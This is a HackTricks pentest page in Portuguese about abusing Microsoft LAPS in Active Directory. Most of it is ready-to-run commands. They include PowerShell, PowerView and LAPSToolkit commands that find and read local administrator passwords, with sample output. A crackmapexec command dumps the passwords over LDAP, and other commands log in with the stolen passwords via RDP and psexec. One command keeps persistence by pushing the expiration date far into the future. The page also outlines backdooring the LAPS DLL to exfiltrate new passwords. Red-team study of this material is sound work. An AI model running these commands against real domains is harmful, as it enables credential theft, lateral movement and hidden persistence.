# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Informações Básicas

A Solução de Senha de Administrador Local (LAPS) é uma ferramenta usada para gerenciar um sistema onde **senhas de administrador**, que são **únicas, aleatórias e frequentemente alteradas**, são aplicadas a computadores associados ao domínio. Essas senhas são armazenadas de forma segura dentro do Active Directory e são acessíveis apenas a usuários que receberam permissão através de Listas de Controle de Acesso (ACLs). A segurança das transmissões de senha do cliente para o servidor é garantida pelo uso de **Kerberos versão 5** e **Padrão de Criptografia Avançada (AES)**.

Nos objetos de computador do domínio, a implementação do LAPS resulta na adição de dois novos atributos: **`ms-mcs-AdmPwd`** e **`ms-mcs-AdmPwdExpirationTime`**. Esses atributos armazenam, respectivamente, a **senha de administrador em texto simples** e **seu tempo de expiração**.

### Verifique se está ativado
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Acesso à Senha LAPS

Você pode **baixar a política LAPS bruta** de `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e então usar **`Parse-PolFile`** do pacote [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para converter este arquivo em um formato legível por humanos.

Além disso, os **cmdlets nativos do PowerShell LAPS** podem ser usados se estiverem instalados em uma máquina à qual temos acesso:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** também pode ser usado para descobrir **quem pode ler a senha e lê-la**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

O [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita a enumeração do LAPS com várias funções.\
Uma delas é a análise de **`ExtendedRights`** para **todos os computadores com LAPS habilitado.** Isso mostrará **grupos** especificamente **delegados para ler senhas LAPS**, que muitas vezes são usuários em grupos protegidos.\
Uma **conta** que **juntou um computador** a um domínio recebe `All Extended Rights` sobre aquele host, e esse direito dá à **conta** a capacidade de **ler senhas**. A enumeração pode mostrar uma conta de usuário que pode ler a senha LAPS em um host. Isso pode nos ajudar a **mirar usuários específicos do AD** que podem ler senhas LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumpando Senhas LAPS Com Crackmapexec**
Se não houver acesso a um powershell, você pode abusar desse privilégio remotamente através do LDAP usando
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Isso irá despejar todas as senhas que o usuário pode ler, permitindo que você obtenha uma melhor posição com um usuário diferente.

## ** Usando a Senha LAPS **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **Persistência do LAPS**

### **Data de Expiração**

Uma vez administrador, é possível **obter as senhas** e **prevenir** que uma máquina **atualize** sua **senha** definindo a **data de expiração para o futuro**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
A senha ainda será redefinida se um **admin** usar o **`Reset-AdmPwdPassword`** cmdlet; ou se **Não permitir que o tempo de expiração da senha seja maior do que o exigido pela política** estiver habilitado na GPO do LAPS.
{% endhint %}

### Backdoor

O código-fonte original do LAPS pode ser encontrado [aqui](https://github.com/GreyCorbel/admpwd), portanto, é possível colocar uma backdoor no código (dentro do método `Get-AdmPwdPassword` em `Main/AdmPwd.PS/Main.cs`, por exemplo) que de alguma forma **exfiltrará novas senhas ou as armazenará em algum lugar**.

Em seguida, basta compilar o novo `AdmPwd.PS.dll` e enviá-lo para a máquina em `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e alterar o horário de modificação).

## Referências
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
